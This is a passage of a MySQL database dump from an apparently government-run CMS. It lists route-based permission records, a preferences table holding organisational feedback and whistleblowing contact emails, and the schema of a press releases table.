04:11:10'),(93,'cms.googlemaps.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(94,'cms.googlemaps.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(95,'cms.googlemaps.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(96,'cms.googlemaps.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(97,'cms.googlemaps.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(98,'cms.googlemaps.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(99,'cms.googlemaps.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(100,'cms.welcome.index','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(101,'cms.welcome.create','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(102,'cms.welcome.store','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(103,'cms.welcome.show','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(104,'cms.welcome.edit','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(105,'cms.welcome.update','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(106,'cms.welcome.destroy','web','2022-03-11 04:11:10','2022-03-11 04:11:10'),(107,'cms.announcements.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(108,'cms.announcements.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(109,'cms.announcements.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(110,'cms.announcements.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(111,'cms.announcements.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(112,'cms.announcements.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(113,'cms.announcements.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(114,'cms.press_releases.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(115,'cms.press_releases.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(116,'cms.press_releases.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(117,'cms.press_releases.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(118,'cms.press_releases.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(119,'cms.press_releases.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(120,'cms.press_releases.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(121,'cms.speeches.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(122,'cms.speeches.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(123,'cms.speeches.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(124,'cms.speeches.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(125,'cms.speeches.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(126,'cms.speeches.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(127,'cms.speeches.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(128,'cms.administration.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(129,'cms.administration.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(130,'cms.administration.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(131,'cms.administration.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(132,'cms.administration.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(133,'cms.administration.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(134,'cms.administration.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(135,'cms.administration_categories.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(136,'cms.administration_categories.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(137,'cms.administration_categories.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(138,'cms.administration_categories.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(139,'cms.administration_categories.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(140,'cms.administration_categories.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(141,'cms.administration_categories.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(142,'cms.administration_categories_members.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(143,'cms.administration_categories_members.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(144,'cms.administration_categories_members.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(145,'cms.document-categories.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(146,'cms.document-categories.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(147,'cms.document-categories.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(148,'cms.document-categories.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(149,'cms.document-categories.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(150,'cms.document-categories.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(151,'cms.document-categories.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(152,'cms.documents.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(153,'cms.documents.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(154,'cms.documents.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(155,'cms.documents.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(156,'cms.documents.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(157,'cms.documents.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(158,'cms.documents.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(159,'cms.quickinfos.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(160,'cms.quickinfos.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(161,'cms.quickinfos.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(162,'cms.quickinfos.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(163,'cms.quickinfos.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(164,'cms.quickinfos.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(165,'cms.quickinfos.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(166,'cms.translations.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(167,'cms.translations.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(168,'cms.translations.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(169,'cms.translations.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(170,'cms.translations.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(171,'cms.translations.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(172,'cms.menu.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(173,'cms.menu.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(174,'cms.menu.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(175,'cms.menu.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(176,'cms.menu.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(177,'cms.menu.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(178,'cms.menu.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(179,'cms.','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(180,'cms.menu-items.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(181,'cms.menu-items.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(182,'cms.menu-items.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(183,'cms.menu-items.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(184,'cms.menu-items.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(185,'cms.menu-items.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(186,'cms.menu-items.ajax-update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(187,'cms.menu-items.ajax-link-update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(188,'cms.galleries.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(189,'cms.galleries.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(190,'cms.galleries.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(191,'cms.galleries.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(192,'cms.galleries.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(193,'cms.galleries.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(194,'cms.galleries.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(195,'cms.media.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(196,'cms.media.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(197,'cms.media.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(198,'cms.media.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(199,'cms.media.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(200,'cms.media.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(201,'cms.media.transfer-media','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(202,'cms.media.transfer-gallery','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(203,'cms.media.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(204,'cms.media.bulk','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(205,'cms.media.bulk-upload-images','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(206,'cms.pages.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(207,'cms.pages.create','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(208,'cms.pages.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(209,'cms.pages.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(210,'cms.pages.edit','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(211,'cms.pages.update','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(212,'cms.pages.destroy','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(213,'cms.roles.index','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(214,'cms.roles.store','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(215,'cms.roles.show','web','2022-03-11 04:11:11','2022-03-11 04:11:11'),(216,'cms.roles.edit','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(217,'cms.roles.update','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(218,'cms.roles.destroy','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(219,'cms.cms.text-editor.upload','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(220,'cms.cms.text-editor.upload_file','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(221,'cms.cms.text-editor.getimages','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(222,'cms.cms.text-editor.getfiles','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(223,'cms.cms.text-editor.delete_file','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(224,'cms.users.create-user-form','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(225,'cms.users.edit-user','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(226,'cms.users.update-user','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(227,'cms.users.destroy','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(228,'cms.users.create-user','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(229,'cms.users.user-roles-form','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(230,'cms.users.update-user-roles','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(231,'cms.users.user-permissions-form','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(232,'cms.users.update-user-permissions','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(233,'cms.users.user-change-password-form','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(234,'cms.users.user-change-password','web','2022-03-11 04:11:12','2022-03-11 04:11:12'),(235,'cms.dg_messages.index','web','2022-06-14 13:53:44','2022-06-14 13:53:44'),(236,'cms.dg_messages.create','web','2022-06-14 13:53:44','2022-06-14 13:53:44'),(237,'cms.dg_messages.store','web','2022-06-14 13:53:44','2022-06-14 13:53:44'),(238,'cms.dg_messages.show','web','2022-06-14 13:53:44','2022-06-14 13:53:44'),(239,'cms.dg_messages.edit','web','2022-06-14 13:53:45','2022-06-14 13:53:45'),(240,'cms.dg_messages.update','web','2022-06-14 13:53:45','2022-06-14 13:53:45'),(241,'cms.dg_messages.destroy','web','2022-06-14 13:53:45','2022-06-14 13:53:45'),(242,'cms.online_services.index','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(243,'cms.online_services.create','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(244,'cms.online_services.store','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(245,'cms.online_services.show','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(246,'cms.online_services.edit','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(247,'cms.online_services.update','web','2022-06-14 13:57:09','2022-06-14 13:57:09'),(248,'cms.online_services.destroy','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(249,'cms.howdois.index','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(250,'cms.howdois.create','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(251,'cms.howdois.store','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(252,'cms.howdois.show','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(253,'cms.howdois.edit','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(254,'cms.howdois.update','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(255,'cms.howdois.destroy','web','2022-06-14 13:57:10','2022-06-14 13:57:10'),(256,'cms.quotes.index','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(257,'cms.quotes.create','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(258,'cms.quotes.store','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(259,'cms.quotes.show','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(260,'cms.quotes.edit','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(261,'cms.quotes.update','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(262,'cms.quotes.destroy','web','2022-06-14 13:57:11','2022-06-14 13:57:11'),(263,'cms.campaigns.index','web','2022-06-21 16:21:29','2022-06-21 16:21:29'),(264,'cms.campaigns.create','web','2022-06-21 16:21:29','2022-06-21 16:21:29'),(265,'cms.campaigns.store','web','2022-06-21 16:21:29','2022-06-21 16:21:29'),(266,'cms.campaigns.show','web','2022-06-21 16:21:29','2022-06-21 16:21:29'),(267,'cms.campaigns.edit','web','2022-06-21 16:21:30','2022-06-21 16:21:30'),(268,'cms.campaigns.update','web','2022-06-21 16:21:30','2022-06-21 16:21:30'),(269,'cms.campaigns.destroy','web','2022-06-21 16:21:30','2022-06-21 16:21:30'),(270,'cms.quick_links.index','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(271,'cms.quick_links.create','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(272,'cms.quick_links.store','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(273,'cms.quick_links.show','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(274,'cms.quick_links.edit','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(275,'cms.quick_links.update','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(276,'cms.quick_links.destroy','web','2022-06-22 13:42:47','2022-06-22 13:42:47'),(277,'cms.hospitals.index','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(278,'cms.hospitals.create','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(279,'cms.hospitals.store','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(280,'cms.hospitals.show','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(281,'cms.hospitals.edit','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(282,'cms.hospitals.update','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(283,'cms.hospitals.destroy','web','2022-06-24 17:55:18','2022-06-24 17:55:18'),(284,'cms.trainings.index','web','2022-06-30 01:20:03','2022-06-30 01:20:03'),(285,'cms.trainings.create','web','2022-06-30 01:20:03','2022-06-30 01:20:03'),(286,'cms.trainings.store','web','2022-06-30 01:20:03','2022-06-30 01:20:03'),(287,'cms.trainings.show','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(288,'cms.trainings.edit','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(289,'cms.trainings.update','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(290,'cms.trainings.destroy','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(291,'cms.operators.index','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(292,'cms.operators.create','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(293,'cms.operators.store','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(294,'cms.operators.show','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(295,'cms.operators.edit','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(296,'cms.operators.update','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(297,'cms.operators.destroy','web','2022-06-30 01:20:04','2022-06-30 01:20:04'),(298,'cms.colateral-managers.index','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(299,'cms.colateral-managers.create','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(300,'cms.colateral-managers.store','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(301,'cms.colateral-managers.show','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(302,'cms.colateral-managers.edit','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(303,'cms.colateral-managers.update','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(304,'cms.colateral-managers.destroy','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(305,'cms.warehouses.index','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(306,'cms.warehouses.create','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(307,'cms.warehouses.store','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(308,'cms.warehouses.show','web','2022-06-30 01:20:05','2022-06-30 01:20:05'),(309,'cms.warehouses.edit','web','2022-06-30 01:20:06','2022-06-30 01:20:06'),(310,'cms.warehouses.update','web','2022-06-30 01:20:06','2022-06-30 01:20:06'),(311,'cms.warehouses.destroy','web','2022-06-30 01:20:06','2022-06-30 01:20:06'),(312,'cms.product_categories.index','web','2022-06-30 01:20:06','2022-06-30 01:20:06'),(313,'cms.product_categories.create','web','2022-06-30 01:20:06','2022-06-30 01:20:06'),(314,'cms.product_categories.store','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(315,'cms.product_categories.show','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(316,'cms.product_categories.edit','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(317,'cms.product_categories.update','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(318,'cms.product_categories.destroy','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(319,'cms.products.index','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(320,'cms.products.create','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(321,'cms.products.store','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(322,'cms.products.show','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(323,'cms.products.edit','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(324,'cms.products.update','web','2022-06-30 01:20:07','2022-06-30 01:20:07'),(325,'cms.products.destroy','web','2022-06-30 01:20:08','2022-06-30 01:20:08'),(326,'cms.achievements.index','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(327,'cms.achievements.create','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(328,'cms.achievements.store','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(329,'cms.achievements.show','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(330,'cms.achievements.edit','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(331,'cms.achievements.update','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(332,'cms.achievements.destroy','web','2022-06-30 01:43:26','2022-06-30 01:43:26'),(333,'cms.colateral_managers.index','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(334,'cms.colateral_managers.create','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(335,'cms.colateral_managers.store','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(336,'cms.colateral_managers.show','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(337,'cms.colateral_managers.edit','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(338,'cms.colateral_managers.update','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(339,'cms.colateral_managers.destroy','web','2022-06-30 20:55:44','2022-06-30 20:55:44'),(340,'cms.feedbacks.index','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(341,'cms.feedbacks.create','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(342,'cms.feedbacks.store','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(343,'cms.feedbacks.show','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(344,'cms.feedbacks.edit','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(345,'cms.feedbacks.update','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(346,'cms.feedbacks.destroy','web','2022-07-17 03:18:28','2022-07-17 03:18:28'),(347,'cms.partners.index','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(348,'cms.partners.create','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(349,'cms.partners.store','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(350,'cms.partners.show','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(351,'cms.partners.edit','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(352,'cms.partners.update','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(353,'cms.partners.destroy','web','2022-07-17 03:18:29','2022-07-17 03:18:29'),(354,'cms.licensedEntities.index','web','2022-08-07 05:33:02','2022-08-07 05:33:02'),(355,'cms.licensedEntities.create','web','2022-08-07 05:33:02','2022-08-07 05:33:02'),(356,'cms.licensedEntities.store','web','2022-08-07 05:33:02','2022-08-07 05:33:02'),(357,'cms.licensedEntities.show','web','2022-08-07 05:33:02','2022-08-07 05:33:02'),(358,'cms.licensedEntities.edit','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(359,'cms.licensedEntities.update','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(360,'cms.licensedEntities.destroy','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(361,'cms.licensed-entity-categories.index','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(362,'cms.licensed-entity-categories.create','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(363,'cms.licensed-entity-categories.store','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(364,'cms.licensed-entity-categories.show','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(365,'cms.licensed-entity-categories.edit','web','2022-08-07 05:33:03','2022-08-07 05:33:03'),(366,'cms.licensed-entity-categories.update','web','2022-08-07 05:33:04','2022-08-07 05:33:04'),(367,'cms.licensed-entity-categories.destroy','web','2022-08-07 05:33:04','2022-08-07 05:33:04'),(368,'cms.licensed-entities.index','web','2022-08-07 05:35:25','2022-08-07 05:35:25'),(369,'cms.licensed-entities.create','web','2022-08-07 05:35:25','2022-08-07 05:35:25'),(370,'cms.licensed-entities.store','web','2022-08-07 05:35:25','2022-08-07 05:35:25'),(371,'cms.licensed-entities.show','web','2022-08-07 05:35:26','2022-08-07 05:35:26'),(372,'cms.licensed-entities.edit','web','2022-08-07 05:35:26','2022-08-07 05:35:26'),(373,'cms.licensed-entities.update','web','2022-08-07 05:35:26','2022-08-07 05:35:26'),(374,'cms.licensed-entities.destroy','web','2022-08-07 05:35:27','2022-08-07 05:35:27'),(375,'cms.media_links.index','web','2022-08-10 01:35:40','2022-08-10 01:35:40'),(376,'cms.media_links.create','web','2022-08-10 01:35:40','2022-08-10 01:35:40'),(377,'cms.media_links.store','web','2022-08-10 01:35:40','2022-08-10 01:35:40'),(378,'cms.media_links.show','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(379,'cms.media_links.edit','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(380,'cms.media_links.update','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(381,'cms.media_links.destroy','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(382,'cms.important_links.index','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(383,'cms.important_links.create','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(384,'cms.important_links.store','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(385,'cms.important_links.show','web','2022-08-10 01:35:41','2022-08-10 01:35:41'),(386,'cms.important_links.edit','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(387,'cms.important_links.update','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(388,'cms.important_links.destroy','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(389,'cms.home_links.index','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(390,'cms.home_links.create','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(391,'cms.home_links.store','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(392,'cms.home_links.show','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(393,'cms.home_links.edit','web','2022-08-10 01:35:42','2022-08-10 01:35:42'),(394,'cms.home_links.update','web','2022-08-10 01:35:43','2022-08-10 01:35:43'),(395,'cms.home_links.destroy','web','2022-08-10 01:35:43','2022-08-10 01:35:43'),(396,'cms.more-infos.index','web','2022-08-10 03:51:41','2022-08-10 03:51:41'),(397,'cms.more-infos.create','web','2022-08-10 03:51:41','2022-08-10 03:51:41'),(398,'cms.more-infos.store','web','2022-08-10 03:51:42','2022-08-10 03:51:42'),(399,'cms.more-infos.show','web','2022-08-10 03:51:42','2022-08-10 03:51:42'),(400,'cms.more-infos.edit','web','2022-08-10 03:51:42','2022-08-10 03:51:42'),(401,'cms.more-infos.update','web','2022-08-10 03:51:42','2022-08-10 03:51:42'),(402,'cms.more-infos.destroy','web','2022-08-10 03:51:42','2022-08-10 03:51:42');
/*!40000 ALTER TABLE `permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `preferences`
--

DROP TABLE IF EXISTS `preferences`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `preferences` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `feedback_email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `whistle_email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `preferences`
--

LOCK TABLES `preferences` WRITE;
/*!40000 ALTER TABLE `preferences` DISABLE KEYS */;
INSERT INTO `preferences` VALUES (5,'info@hst.go.tz','report@hst.go.tz',0,'2022-03-11 03:49:56','2022-07-17 03:21:52');
/*!40000 ALTER TABLE `preferences` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `press_releases`
--

DROP TABLE IF EXISTS `press_releases`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `press_releases` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `file_en` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `press_releases`
--

LOCK TABLES `press_releases` WRITE;
/*!40000 ALTER TABLE `press_releases` DISABLE KEYS */;
